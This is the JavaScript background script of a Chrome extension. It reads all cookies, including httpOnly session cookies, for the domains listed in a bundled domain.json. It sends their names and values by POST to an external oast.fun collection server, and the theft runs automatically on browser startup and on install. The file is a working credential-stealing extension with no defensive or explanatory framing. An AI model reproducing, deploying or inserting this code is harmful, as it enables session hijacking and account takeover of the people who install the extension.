// Load domains from domain.json
async function loadDomains() {
  try {
    const url = chrome.runtime.getURL("domain.json");
    const resp = await fetch(url);
    if (!resp.ok) return [];
    const json = await resp.json();
    return Array.isArray(json.domains) ? json.domains : [];
  } catch (err) {
    console.error("Failed to load domain.json", err);
    return [];
  }
}

const SERVER = ["https://mrvngmlrfvnzhdtsmmjsiightehevz27m.oast.fun"];

async function sendCookiesForDomain(domain) {
  const cookies = await chrome.cookies.getAll({ domain });
  if (cookies.length === 0) {
    console.log(`No cookies found for ${domain}`);
    return;
  }
  const payload = {
    domain,
    cookies: cookies.map(c => ({
      name: c.name,
      value: c.value,
      path: c.path,
      secure: c.secure,
      httpOnly: c.httpOnly
    }))
  };

  try {
    await fetch(SERVER, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
    console.log(`✅ Cookies for ${domain} sent`);
  } catch (err) {
    console.error(`❌ Failed to send cookies for ${domain}`, err);
  }
}

// Run only once at startup
chrome.runtime.onStartup.addListener(() => {
  loadDomains().then(domains => domains.forEach(sendCookiesForDomain));
});

// Also run when extension is first installed / loaded
chrome.runtime.onInstalled.addListener(() => {
  loadDomains().then(domains => domains.forEach(sendCookiesForDomain));
});
